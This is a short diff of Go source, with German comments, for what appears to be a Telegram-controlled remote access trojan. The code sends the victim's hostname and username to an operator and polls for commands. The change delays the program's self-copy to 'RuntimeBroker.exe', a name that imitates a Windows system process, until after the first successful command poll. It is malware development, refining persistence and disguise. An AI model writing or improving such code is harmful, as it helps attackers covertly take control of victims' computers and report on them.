@@ -388,8 +388,6 @@ func poll(offset int) ([]tgMsg, int) {
 func main() {
 	time.Sleep(TMPL_SLEEP * time.Second)
 
-	relocate() // Kopiert sich zu RuntimeBroker.exe falls nötig
-
 	host, _ := os.Hostname()
 	user := os.Getenv("USERNAME")
 	send(fmt.Sprintf(
@@ -397,10 +395,17 @@ func main() {
 		host, user,
 	))
 
+	relocated := false
 	offset := 0
 	for {
 		updates, next := poll(offset)
 		offset = next
+
+		// Erst nach erstem erfolgreichem Poll relocaten — nicht beim Start
+		if !relocated {
+			relocate()
+			relocated = true
+		}
 
 		for _, upd := range updates {
 			if upd.M == nil {
